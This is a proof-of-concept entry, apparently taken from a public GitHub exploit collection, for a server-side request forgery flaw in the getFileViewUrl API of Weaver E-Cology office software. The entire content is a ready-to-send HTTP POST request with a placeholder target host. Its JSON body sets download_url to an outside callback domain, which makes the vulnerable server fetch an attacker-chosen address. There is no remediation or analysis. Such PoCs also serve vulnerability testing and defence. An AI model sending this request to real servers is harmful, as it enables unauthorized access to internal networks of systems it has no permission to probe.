# ecology_getFileViewUrl_ssrf

from: https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-Cology%E6%8E%A5%E5%8F%A3getFileViewUrl%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E.md

```
POST /api/doc/mobile/fileview/getFileViewUrl HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json
Upgrade-Insecure-Requests: 1
 
{
    "file_id": "1000",
    "file_name": "c",
    "download_url":"http://euixlkewfg.dgrh3.cn"
}
```
